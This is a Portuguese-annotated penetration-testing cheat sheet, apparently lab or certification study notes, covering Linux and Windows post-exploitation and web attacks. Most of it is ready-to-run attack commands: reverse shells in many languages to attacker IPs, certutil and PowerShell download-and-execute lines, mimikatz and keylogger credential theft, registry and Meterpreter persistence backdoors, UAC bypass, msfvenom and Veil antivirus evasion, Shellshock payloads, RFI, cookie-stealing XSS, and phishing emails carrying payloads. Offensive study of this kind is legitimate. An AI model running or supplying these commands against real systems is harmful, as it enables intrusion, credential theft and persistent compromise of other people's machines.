	#Abusing SUID
		https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux
		#TCPDUMP 
			echo $'id\ncat /etc/shadow' > /tmp/.test
			chmod +x /tmp/.test
			sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

	#Compilar exploit 32bits no Kali 64 
		$ gcc -m32 -o exploit codigo.c 

	#Samba Secrets to Domain Admin - Quando um novo usuário SAMBA é criado, nomarlmente suas informações são salvas em um arquivo secrets.tdb
		https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9
		#Procurar o secrets.tdb ao invadir uma máquina linux que faç parte de um Domínio
		ls /var/lib/samba/private/
		tdbdump /var/lib/samba/private/secrets.tdb 
		pth-smbclient #com o hash NTLM obtido acima

#POST - LINUX
	#Credenciais do SWAP 
		cat /proc/swaps
		strings /dev/sda5 |grep “&password=“
		https://github.com/sevagas/swap_digger
	#3snake - usa strace buscando por credenciais 
		wget -q https://www.github.com/blendin/3snake/archive/master.zip 
		unzip master.zip
		cd 3snake-master
		make
		./3snake -d -o creds.txt 
	#Strace Gather Credentials 
		strace -f -p $(pgrep -f "/usr/sbin/sshd") -s 128 -o /root/.gpg/auth.log
	#MIMIPeguin
		https://github.com/huntergregal/mimipenguin

	#Linux Enumeration 
		cat /etc/resolv.conf
		ifconfig -a
		route -n
		traceroute -n 10.10.10.10
		arp -a
		netstat -tupan
		ss -twurp #Lista conexoes processos usuarios e bytes
		nmap -sT -p 5555 portquiz.net #Verficar regra de firewall - Scanear fora e ver quais portas pode acessar desse dominio 
		id 
		uname -a
		grep $USER /etc/passwd 
		lastlog
		w
		last
		for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user; done
		cat /etc/passwd | cut -f1,3,4 - d":" |grep "0:0" | cut -f1 -d":" | awk '{print $1}'
		cat /etc/passwd
		cat /etc/shadow
		cat /etc/sudoers
		cat /root/.bash_history
		sudo -l 
		cat /etc/issue
		cat /etc/*-release
		echo $PATH
		cat /etc/crontab && ls -als /etc/cron*
		find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
		ps 
		lsof -n 
		dpkg -l
		ps aux | awk '{print $11}' | xargs -r ls -la 2> /dev/null | awk '!x[$0]++'

#POST - WINDOWS
	#Enumeração básica
		systeminfo
		meterpreter > getprivs
		c:\ whoami /priv
		c:\ net localgroup
		whoami
		echo %USERNAME%
		set USERNAME
		set
		net accounts #configuração de usuário do SO

		#REDE 
			ipconfig
			ipconfig /all 
			ipconfig /displaydns
			arp -a 
			netstat -na 
			netstat -naob
			netstat -nr 
			netstat -nao | findstr <porta>

		#Servicos
			tasklist /svc 
			taskkill /PID 2345
			tasklist /svc | findstr <pid>
			tasklist /svc /fi “pid eq <pid>”


		#Verificar Serviços 
			C:\ wmic service where 'Caption like "Remote%" and started=true' get Caption
			C:\ wmic service get Caption,StartName,State,pathname
			C:\ net start
			$ service --status-all
			meterpreter > ps
			meterpreter > run service_manager -l 
			meterpreter > run post/windows/gather/enum_services
			accesschk.exe /accepteula -uwcqv "Authenticated Users" *
			accesschk.exe /accepteula -uwcqv user daclsvc

		#Service Controller
			sc /?
			sc query 
			sc \\<IP_ALVO> query
			sc query state=all
			sc query NOMEdoSERVICO
			sc query | findstr /i “service_name”

			sc config <nome_do_serviço> start= demand
			sc start <nome_do_serviço>
			sc stop <nome_do_serviço>
			sc create <nome_do_serviço> binpath= <comando>
			sc query schedule
			net start <SERVICO> 
			net stop <SERVICO> 

		#Agendar Tarefas 
			at \\<IP_do_alvo> <HH:MM> <A|P> <comando>

			schtasks /create /tn <nome_tarefa> /s <IP_do_alvo> /u <usuário> /p <senha> /sc <frequência> /st <hora_início> /sd <data_início> /tr <comando>
			schtasks /create /tn pingx /sc once /st 19:56:00 /tr "ping 172.16.210.200"

			schtasks /create /tn fivemin /sc minute /mo 5 /tr "C:\bind.exe"

			#Exemplo 
				net time \\localhost
				schtasks /create /tn ncsvc /sc once /st 15:31:00 /tr "c:\temp\nc.exe -d -n 172.16.210.200 8443 -e cmd.exe"
				schtasks /query /tn ncsvc /f
				schtasks /delete /tn ncsvc /f

			at \\<IP_do_alvo>
			schtasks
			schtasks /query /s <IP_do_alvo>



		#Interagir com chaves de registro 
			reg query <nome_chave_registro>
			reg add <nome_chave_registro> /v <valor> /t <tipo> /d <dado>
			#Remotamente - necessário estabelecer sessão SMB como administrador
			reg add \\<nome_da_maquina\HKLM\Software\Key
			net session

		#Compartilhamentos 

			net share
			net use \\<IP_do_alvo> <senha> /u:<usuário>
			net use 
			net use * \\<IP_do_alvo>\<compartilhamento> <senha> /u:<usuário>
			net use * \\<IP_do_alvo>\<compartilhamento> <senha> /u:<nome_da_máquina>\<usuário>
			net use x: \\<IP_do_alvo>\compartilhamento
			net use * /del /y

			net use \\127.0.0.1\ipc$ “” /u:“”


		#Verificar Aplicações instaladas no windows
			meterpreter > run post/windows/gather/enum_applications
		#Adicionar novos usuários
			C:\ net user Fulano Senha /add
			C:\ net localgroup "Administrators" Fulano /add
		#Verificar Domínios 
			C:\ net view /domain
			meterpreter > run post/windows/gather/enum_domains
			C:\ net group “Domain Controllers” /domain
		#Verificar usuários do Domínio
			meterpreter > run post/windows/gather/enum_ad_users
			C:\ net user /domain
		#Ver usuários de um grupo 
			C:\ net localgroup Administrators
		#Ver compartilhamentos 
			C:\ net share
			meterpreter > run enum_shares
		#Enumeração automática com Metasploit 
			meterpreter > run winenum
			meterpreter > run 

	#FileZilla - mesmo que nao retorne a senha em claro, mostra arquivo onde ela se encontra
		run post/multi/gather/filezilla_client_cred

	#Telnet - telnet_login - bruteforce que tenta devolver shell 
		use scanner/telnet/telnet_login

	#Keylogger
		meterpreter > run keylogrecorder -c 0 
		meterpreter > keyscan_start
		meterpreter > keyscan_dump
		meterpreter > keyscan_stop

	#Meterpreter search por KeePass database file
		meterpreter > search -d C:\\Users\\els\\ -f *.kdbx

	#Chrome
		meterpreter > run post/windows/gather/enum_chrome
		meterpreter > run post/windows/gather/enum_applications

	#Download arquivos windows 
		PS > iex (New-Object Net.Webclient).DownloadFile('http://10.10.10.10/payload.exe', 'c:\tmp\payload.exe')
		powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadFile('http://192.168.119.137:443/rev137.exe', 'C:\xampp\htdocs\books\myFiles\images\rev.exe')
		powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadFile('http://192.168.45.226/winPEASx64.exe', 'C:\tmp\wp64.exe')
		powershell.exe -nop -ep bypass -C iex (New-Object Net.Webclient).DownloadFile('http://192.168.119.137/mimikatz.exe', 'C:\xampp\htdocs\books\myFiles\images\mm.exe')
		certutil.exe -urlcache -split -f 'http://192.168.45.240/tmp/met.exe' met.exe
		certutil.exe -urlcache -split -f http://192.168.45.226/met.exe met.exe


		certutil.exe -urlcache -split -f "http://foophonesels.com:650/tmp/buff.exe" teste.exe 
		certutil.exe -hashfile nc.exe #Verifica o hash  do arquivo baixado 
		bitsadmin /transfer <nome_job> /priority foreground http://<IP_atacante>/nc.exe c:\temp\nc.exe
		bitsadmin /transfer new /priority foreground http://192.168.45.226/clm_226.exe c:\temp\clm.exe


		powershell.exe -Command "iex (New-Object Net.WebClient).DownloadString('http://10.100.11.101/Get-VaultCredential.ps1'); Get-VaultCredential"
		powershell.exe -c "Invoke-WebRequest 'http://10.10.14.15/shell.exe' -OutFile 'C:\xampp\htdocs\gym\upload\shell.exe'"
		
		#Em múltiplas linhas e com download File 
			echo $storageDir = $pwd > wget.ps1
			echo $webclient = New-Object System.Net.WebClient >> wget.ps1
			echo $url = "http://192.168.56.103:8000/shell.exe" >> wget.ps1
			echo $file = "rolha.exe" >> wget.ps1
			echo $webclient.DownloadFile($url,$file) >> wget.ps1
			powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

	#Backdoor
		#Meterpreter
		meterpreter > run persistence -A -i 5 -p 8080 -r 10.10.10.16
					  run persistence -U -i 5 -p 53 -r 172.16.210.200
		#Manual
		meterpreter > upload /root/my_bd.exe C:\\windows\
			#At system Startup 
		meterpreter > reg setval –k HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\bind.exe"' -v bind
		meterpreter > reg setval –k HKLM\\software\\microsoft\\windows\\currentversion\\run -d '"C:\inetpub\ftproot\reverse.exe"' -v cd_name

	#Habilitar Remote Desktop 
		#Comando para habilitar o remote desktop: forma 1 
			C:\ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
		#Comando para habilitar RDP: forma 2
			meterpreter > run getgui -h
			meterpreter > run getgui -e
	 	#Adcionar usuário no grupo do RDP 
		 	c:\ net localgroup
		 	c:\ net localgroup "Remote Desktop Users"
		 	Meterpreter > run getgui -u cassio -p 123456
		 	C:\ net localgroup "Remote Desktop Users" AdminELS /add

	#Adicionar Usuários ao grupo Administradores
		c:\ net localgroup "Administrators" stduser /add 

	#Credential_collector - Coleta credenciais de login 
		meterpreter > run post/windows/gather/credentials/credential_collector

	#MIMIKATZ
		#Caso no Meterpreter preferir processos de 64bits 
		meterpreter > ps -A x86_64 -s
		meterpreter > migrate [PID de processo x86_64]
		meterpreter > load mimikatz 
		#hoje em dia 
		meterpreter > load kiwi
		#Senhas em claro
		meterpreter > wdigest
		#Tudo
		meterpreter > creds_all

		#MIMI
		mimikatz_command -f sekurlsa::searchPasswords

		#Interativo 
		mimikatz
		privilege::debug
		sekurlsa::logonpasswords


	#WCE - Windows Credential Editor - https://www.ampliasecurity.com/research/windows-credentials-editor/

	#Bypasss UAC
		#Verificar privilégios
		meterpreter > run post/windows/gather/win_privs
		c:\ whoami && net user
		C:\ net uset username
		c:\ whoami /priv
		c:\ whoami /all 
		#Verificar uac 
		c:\ reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System
		msf > search bypassuac
		#Explorar o bypass de UAC para escalar privilégios
		meterpreter > upload /usr/share/metasploit-framework/data/post/bypassuac-x64.exe
		c:\ .\bypassuac-x64.exe /c c:\reverse.exe
		meterpreter > getsystem

	#Exploit Suggester 
		use post/multi/recon/local_exploit_suggester
		#Verificar tanto com uma sessão de 64 e 32 bits
		apt install python-xlrd
		wget https://raw.githubusercontent.com/GDSSecurity/ Windows-Exploit-Suggester/master/windows-exploit- suggester.py
		python windows-exploit-suggester.py --update
		python windows-exploit-suggester.py --database 2019-03-13-mssb.xls --systeminfo win10-sysinfo.txt


	#Incognito - Personificar Tokkens
		meterpreter > use incognito
		meterpreter > list_tokens -u 
		meterpreter > impersonate_token els\\els
	
	#HashDump
		#Caso HashDump não funcione mesmo como system 
		meterpreter > run hashdump
		meterpreter > run post/windows/gather/smart_hashdump
		#ou
		meterpreter > migrate [PID]

	#Unquoted service path - Servicos contendo espaço no path sem aspas
		C:\ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
		#Comando acima tem 3 aspas mesmo"
		C:\ sc qc [NOME do SERVIÇØ]
		msf > use exploit/windows/local/trusted_service_path
		#Verificar se é capaz de parar e reiniciar o serviço
			C:\ sc stop [NOME do SERVIÇØ]
			C:\ sc start [NOME do SERVIÇØ]
		#Saber com qual privilégio o serviço roda 
			C:\ sc qc [NOME do SERVIÇØ] 
		#Verificar possibilidade de escrita no windows
			C:\ icacls "Diretório"
		#Rebotar a máquina 
			C:\ shutdown /r 
		#Com possibilidade de Escrita pasta do executável, considerar injetar o payload com venom 
			$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.50.50.100 LPORT=8081 -f exe -e x84/shikata_ga_nai -i 15 -k -x openvpnserv.exe.bkp > openvpnserv.exe
		#Automático com metasploit
			msf > use explit/windows/local/unquoted_service_path

	#SessionGopher - PowerShell para pegar senhas
		#Download e execução na memória
		C:\ powershell.exe -nop -ep bypass -C iex (New-Object NEt.Webclient).DownloadString('http://10.10.10.10/SessionGopher.ps1'); Invoke-SessionGohper -Thorough

	#Movimento lateral - Windows 7 não aceita psexec de um non-domain admin
		#Subir Payload e alterar suas permissões
		icacls payload.exe /grant EVERYONE:(F)
		#usar o módulo run_as 
		msf > use post/windows/manage/run_as
		msf > set CMD
		msf > set session
		msf > set USER
		msf > set PASSWORD
		msf > set DOMAIN #no caso o nome da máquina local
		msf > exploit

	#Arquivos de Domínio
		#Active Directory Policies estão em 
		%USERDNSDOMAIN%\Policies
		%LOGONSERVER%\Sysvol
			C:\ > net use X: \\DC01\Sysvol
			C:\ dir /s *.xml
		#Quebrar hash encontrado no xml das políticas com gpp-decrypt
		$ gpp-decrypt HASH
	#DOMAIN 
		c:\ set
		meterpreter > load extapi 
		meterpreter > adsi_.....
	#Encontrar o Domain controller
		nslookup -querytype=SRV _LDAP._TCP.DC._MSDCS.domain_name
		#ou
		nslookup
			> set type=all
			> _ldap._tcp.dc._msdcs.NOMEDODOMNIO
		#Com PowerShell
		PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
		#Com Prompt normal 
		C:\ > nltest /server:ip_of_any_member /dclist:domain_name


		meterpreter > run post/windows/gather/enum_computers
		Empire > usemodule situational_awareness/network/powerview/get_domain_controller

#Firefox - Profile Decrypt - https://github.com/unode/firefox_decrypt/blob/master/firefox_decrypt.py
	meterpreter > run post/multi/gather/firefox_creds

	cd /home/user/.mozilla/firefox/XXXXX.default/
	python firefox_decrypt.py  

#Bypass de AV - https://sushant747.gitbooks.io/total-oscp-guide/content/bypassing_antivirus.html
	#Enconding -e
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e x86/shikata_ga_nai -i 9 -o meterpreter_encoded.exe
	#Encoding num arquivo nao malicioso
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=5555 -f exe -e x86/shikata_ga_nai -i 9 -x calc.exe -o bad_calc.exe
	#Cadeia de Encoding
	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 20 LHOST=172.16.5.50 LPORT=5110 -f raw | msfvenom -a x86 --platform windows -e x86/alpha_upper -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 10 -x 360zip_setup_4.0.0.1030.exe -f exe > setup.exe
	###VEIL### Gera um executável para ser enviado ao alvo 
	apt -y install veil
	/usr/share/veil/config/setup.sh --force --silent
	sudo veil
		Veil>: use 1
		Veil/Evasion>: list
		Veil/Evasion>: use 26 #Python - vai gerar um exe com o PyInstaller 
		[powershell/meterpreter/rev_tcp>>]: set LHOST 172.16.155.8
		[powershell/meterpreter/rev_tcp>>]: set LPORT 5555
		[powershell/meterpreter/rev_tcp>>]: generate 

#Nessus 
	cd .msf4/plugins
	wget https://raw.githubusercontent.com/darkoperator/Metasploit-Plugins/master/pentest.rb


	sudo service nessusd start
	msf6 > load nessus
	msf6 > nessus_connect username:password@192.168.1.10:8834
	#Realiza scan através do nessus web GUI 
	msf6 > nessus_scan_list #Verifica scans realizados no webGUI 
	msf6 > nessus_report_vulns 6
	msf6 > nessus_report_hosts 6
	msf6 > nessus_db_import 6

	msf6 > load pentest 
	msf6 > vuln_exploit

#MsVenom + SSL
	msf (gather/impersonate_ssl) > set RHOST www.microsoft.com
	msf > run 

	msf > use payload/windows/x64/meterpreter/reverse_https
	msf > set LHOST 
	msf > set LPORT 
	msf > set handlersslcert caminho_para_arquivo_do_impersanetSSL.pem 
	msf > set stagerverifysslcert true 
	msf > generate -t exe -f arquivo.exe

#Find
	find . -type f -empty -print -delete # Deleta arquivos Vazios
	find /home/* -name *.*history* -print 2> /dev/null
	find / -perm -4000 -type f 2> /dev/null #SUID files 
	find / -uid 0 -perm -4000 -type f 2> /dev/null #SUID file do root
	find / -perm -2000 -typ3 f 2> /dev/null #GUID file
	find -perm -2 -type f 2> /dev/null #World-Writable 
	find /etc/init.d/ ! -uid 0 -type f 2>/dev/null |xargs ls -la
	find /etc/cron* -type f -perm -o+w -exec ls -l {} \;

	find / -perm -222 -type d 2>/dev/null
	find / -type f -perm /o+w 2>/dev/null | grep -v proc
	find / -perm -4000 2>/dev/null
	find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -lah {} \; 2>/dev/null >> /tmp/SUID_files.txt
	find / -type f -exec grep "flag is :" {} \; 2>/dev/null
	find / -name ".*" -print 2>/dev/null
	find / -type f -exec grep 'technawi' {} \; 2>/dev/null
	grep -rnw -exclude-dir=proc 'technawi' / 2>/dev/null
	find / -user technawi -type f 2>&1 | grep -v "Permission" | grep -v "No such"
	ls -laR
	find / -writable -type  f 2>/dev/null | grep -v "/proc/"

#WEB e Fuzzing
	#EyeWitness - parecido com aquatone - navega pela lista de ip tirando prints das interfaces web, com a opção --active-scan tenta se logar em algumas páginas mas pode ser muito ruidoso 
	eyewitness --prepend-https --jitter --web --no-dns -f urls.txt
	#
	nikto -host http://192.168.56.104
	dirb http://192.168.56.103:1898/
	dirb http://192.168.56.103 -X .php
	dirb http://192.168.56.103 -X .php -o saida.txt
	gobuster -e -u http://192.168.56.103/ -w /usr/share/wordlists/dirb/common.txt
	gobuster dir -u http://10.11.1.128:4167/ -w /usr/share/dirb/wordlists/big.txt --timeout 60s -x asp,aspx --proxy socks5://127.0.0.1:9050
	gobuster dir -u http://10.11.1.128:4167/ -w /usr/share/dirb/wordlists/big.txt -a "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36" --timeout 60s -x asp,aspx
	dirbuster
	w3af
	#CMSMAP 
	cmsmap https://example.com
	sudo /mnt/hgfs/HD_KALI/TOOLs/Git_Repository/CMSmap/cmsmap.py http://10.11.1.50 -f D
	sudo /mnt/hgfs/HD_KALI/TOOLs/Git_Repository/CMSmap/cmsmap.py -U PC 
	#WPSCAN
	wpscan --url http://192.168.29.143/secret --wp-content-dir wp-content -e u,ap,at
	wpscan -U admin -P /mnt/hgfs/Downloads/ctf/10k_comom.txt --url http://192.168.29.143/secret --wp-content-dir wp-content
	use exploit/unix/webapp/wp_admin_shell_upload
	#FFUf - https://github.com/ffuf/ffuf - onde tem FUZZ ele substitui
		#Diretório
		ffuf -w /path/to/wordlist -u https://target/FUZZ -e .bak,_bak,01,.cgi,.old,.bac,.inc 
		ffuf -w /usr/share/wordlists/dirb/big.txt -u http://172.16.64.140/project/FUZZ -H "Authorization: Basic YWRtaW46YWRtaW4="
		#Exemplo de encontrar pasta "escondida" em um LFI
		ffuf -w /usr/share/dirb/wordlists/big.txt -u 'http://megahosting.htb/news.php?file=../../../../../../../../../usr/share/tomcat9/FUZZ/tomcat-users.xml' -fs 0
		#Virtual Host: fs é para não exibir as respostas com file size XXXX para evitar falsos positivos 
		ffuf -H "Host: VIRTUALHOSTNAOEXISTENTE" -u https://target #Para descobrir o FS de respostas erradas 
		ffuf -w /path/to/vhost/wordlist -u https://target -H "Host: FUZZ" -fs 4242

	#WFUZZ - Virtual Host 
	/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
	wfuzz -w wordlist.txt -H "HOST: FUZZ.htb" -u http://10.10.10.188 --hc 400 --hh 8193

#Windows - Misc 
	#FIREWALL 
	#NETSH FIREWALL Windows - Ver configurações de Firewall
		netsh firewall show config
		netsh advfirewall show allprofiles

	#Habilitar RDP e liberar no firewall
		#Comando para habilitar o Remote Desktop
			reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
		#Comando para liberar a porta 3389 no firewall
			netsh firewall add portopening TCP 3389 "Remote Desktop"
		##ou##
		#Comando para derrubar o firewall no WinXp
			netsh firewall set opmode mode=DISABLE
		##ou##
			netsh advfirewall set allprofiles state off
			netsh advfirewall show allprofiles state
	#Adicionar ou remover regras de firewall 
		netsh advfirewall /?
		netsh advfirewall firewall add rule name=“<comment>” dir=in action=allow remoteip=<IP_Atacante> protocol=TCP localport=<porta>
		netsh advfirewall firewall del rule name=“<comment>”


#Remote Desktop 
	rdesktop 172.16.5.5 -g 80% -u bcaseiro -p letmein
	xfreerdp /u:analyst1 /d:els.bank /p:'P@ssw0rd123' /v:172.16.80.100
	xfreerdp /u:share_admin /d:FOOPHONES /pth:aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb /v:10.185.10.34
	xfreerdp /u:administrator /d:SVCLIENT73 /pth:aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb /v:10.11.1.24
	proxychains xfreerdp /u:analyst1 /d:els.bank /p:'P@ssw0rd123' /v:172.16.80.100 +clipboard 

#SENDEMAIL
	#Enviar e-mail com necessidade de login 
	sendemail -l email.log     \
	    -f "sender@domain.com"   \
	    -u "Email Subject 1"     \
	    -t "receiver@domain.com" \
	    -s "smtp.gmail.com:587"  \
	    -o tls=yes \
	    -xu "youremail@gmail.com" \
	    -xp "Email Password" \
	    -o message-file="/tmp/mailbody.txt"

	#Enviar e-mail sem precisar de login 
	sendemail -t "bcaseiro@sportsfoo.com" -f "atk@sportsfoo.com" -u "Titulo do e-mail" -s 172.16.5.10 -o tls=no message-file=msg_shell.txt
	sendemail -t "dev-user@els.corp" -f "atk@els.corp" -u "Click On This" -s 172.16.250.2 -o tls=no message-file=rev3.ps1 
	cat msg.txt| sendemail -t "dev-user@els.corp" -f "atk@els.corp" -u "Click On This" -s "172.16.250.2:25"  -o tls=no -a att3.bat

#Reverse Shell
	#Reverse Shell - Openssl
		#Attacker
		openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
		openssl s_server -quiet -key key.pem -cert cert.pem -port 443
		#Target 
		mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect <attacker_IP>:443 > /tmp/x; rm /tmp/x
	
	# Reverser shell - Ubuntu que não conhecia 
		mknod /tmp/backpipe p 
		/bin/sh 0</tmp/backpipe | nc 192.168.119.205 8080 1> /tmp/backpipe 

	#Reverse Shell - ICMP 
		icmpsh 
	#BASH 
		bash -i >& /dev/tcp/192.168.119.215/12345 0>&1
	#PERL
		perl -e 'use Socket;$i="172.16.80.5";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
	#PYTHON
		/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.137",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
		python -c 'import pty; pty.spawn("/bin/bash")'
		python3 -c 'import pty; pty.spawn("/bin/bash")'
	#PHP
		php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
	#RUBY
		ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
	#NetCat
		nc -e /bin/sh 10.0.0.1 1234
	#MKFIFO
		rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1| nc 192.168.45.208 443 >/tmp/f
	#JAVA
		r = Runtime.getRuntime()
		p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
		#p.waitFor() #Executar funcao 
	#XTERM
		xterm -display 10.0.0.1:1 #Alvo
		Xnest :1 # Atacante Listener
		xhost +targetip # Atacante Autorizacao 


	#Upgrade Shell
		https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
			python -c 'import pty; pty.spawn("/bin/bash")'

			socat file:`tty`,raw,echo=0 tcp-listen:1234 #Listener

			socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.102:1234 # Victim
			wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

			# In reverse shell
			$ python -c 'import pty; pty.spawn("/bin/bash")'
			Ctrl-Z

			# In Kali
			$ stty raw -echo
			$ fg

			# In reverse shell
			$ reset
			$ export SHELL=bash
			$ export TERM=xterm-256color
			$ stty rows <num> columns <cols>

#ShellShock - Vulnerabilidade em CGI programs 
	env x=‘() { :;}; echo vulnerable’ bash -c “echo this is a test”
	./dirsearch.py -u http://192.168.13.29/ -e cgi -r #buscar por arquivos de extensão CGI 
	nmap --script http-shellshock --script-args uri=/cgi-bin/login.cgi 192.168.13.29 -p 80 #verificar se é vulneravel a shellshock
	#explorar pelo User agent 
	wget -U "() { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://192.168.13.29/cgi-bin/login.cgi && cat login.cgi
	wget -U "() { foo;};echo; /bin/nc 192.168.13.18 1234 -e /bin/sh" http://192.168.13.29/cgi-bin/login.cgi
	User-Agent: () { :;}; ping -c 5 -p unique_string attacker.machine

	nikto --url http://172.16.80.22 -C all
	gobuster dir -u http://172.16.80.22/cgi-bin/ --random-agent  -w /usr/share/dirb/wordlists/common.txt -x cgi 
	nmap 172.16.80.22 -p 80 --script=http-shellshock --script-args uri=/cgi-bin/calendar.cgi
	#https://github.com/erinzm/shellshocker
	python shellshocker.py http://10.11.1.71/cgi-bin/admin.cgi
	#Bind Shell
	$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
	#Reverse shell
	$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
	#Reverse shell using curl
	curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
	#Reverse shell using metasploit
	> use multi/http/apache_mod_cgi_bash_env_exec
	> set targeturi /cgi-bin/admin.cgi
	> set rhosts 10.1.2.11
	> run

#HeartBleed - Vulnerabilidade do OpenSSL 
	nmap --script ssl-heartbleed 192.168.13.58
	msf > use auxiliary/scanner/ssl/openssl_heartbleed

# Tomcat default Creds https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
	msf > use auxiliary/scanner/http/tomcat_mgr_login

#Laudanum - Jps Webshell pronto em 
	cd /usr/share/laudanum/jsp

#SQLMAP 
	sqlmap -r arquivo.txt -p id --technique=BEUSTQ -u URL 
	#Teste no UserAgent
		sqlmap -u 'http://1.lab.sqli.site/getBrowserInfo.php' --user-agent="sqlmap*" --batch 
		sqlmap -u 'http://1.lab.sqli.site/getBrowserInfo.php' --headers="User-Agent:test*\nReferer:bla"
	#Teste no referer
		sqlmap -r arquivo.txt -p id --technique=BEUSTQ -u URL  --referer="target.com*"
	#Teste em qualquer campo do cabeçalho
		sqlmap -u 'http://1.lab.sqli.site/getBrowserInfo.php' --headers="Foo:bar*"
	sqlmap -r arquivo.txt -p id --technique=BEUSTQ -u URL --string "String presente em caso verdadeiro" --not-string "String presente em caso falso"
	sqlmap -u <URL> --suffix "'));" <other switches>
	sqlmap -u <target> --banner <other options> --keep-alive
	sqlmap -u <target> --users <other options>
	sqlmap -u <target> --is-dba <other options>
	sqlmap -u <target> --dbs <other options>
	sqlmap -u <target> -D <database> --tables <other options>
	sqlmap -u <target> -D <database> -T <tables, comma separated list> --columns <other options>
	sqlmap -u <target> -D <database> -T <table> -C <columns list> --dump <other options> --keep-alive --threads 5 

#SCP
	scp arquivo.txt root@192.168.56.102:/tmp/arquivo.txt
	scp root@192.168.56.102:/tmp/arquivo.txt arquivo.txt

#RFI - via metasploit
	> use exploit/unix/webapp/php_include
	> set RHOSTS
	> set PHPURI /index.php?pag=XXpathXX
	> set SRVHOST
	> set SRVPORT 
	> set PAYLOAD php/meterpreter/reverse_tcp 
	> exploit 
	# no exercicio 

	ou 

	> set PAYLOAD php/exec
	> set CMD shell.exe 
	> exploit 

	#RFI pode ser execudada manualmente entretanto caso coloque .php ao fim nao dará certo (ele executará no atacatante ao invé de no alvo)
	http://members.foocompany.com/index.php?pag=http://172.16.5.20/shell

	http://members.foocompany.com/index.php?pag=http://172.16.5.20/comando&cmd=certutil.exe%20-urlcache%20-split%20-f%20%22http://172.16.5.20/reverse.exe%22%20s.exe
	http://members.foocompany.com/index.php?pag=http://172.16.5.20/comando&cmd=s.exe


#XSS - https://gist.github.com/soaj1664/9588791
	<script type=text/javascript src=http://172.16.111.30:8080/batman></script>
	<script type=text/javascript src=http://172.16.111.30:8080/batman></script>
	<script> alert('XSS'); </script>
	<img src="http://attacker/site">
	<img/src=`%00` onerror=this.onerror=confirm(1)>
	<img/src=`%00` onerror=alert('XSS')>
	<iframe src="http://10.100.13.200/batman"></iframe>
	<html> <body onload='alert("XSS") '></body></html>

		<html><body onload='document.location.replace("http://attacker/post.asp?name=victim1&message =" + document.cookie + "<br>" + "URL:" + document.location);'>
		</body>
		</html>



	#httponly disable
	<script>
		var i=new Image(); 
		i.src="http://attacker.site/steal.php?q="%2bdocument.cookie; 
	</script>


#PHP cmd SHELL
	<?php system('whoami') ?>

#PHP - Quick Server
	php -S 0.0.0.0:80

#PHP - inserção de iframe em PHP
	echo '<iframe src="http://10.100.13.200/batman" width=1 height=1 style="visibility:hide; position:absolute;" ></iframe>';

#Perl to Shell
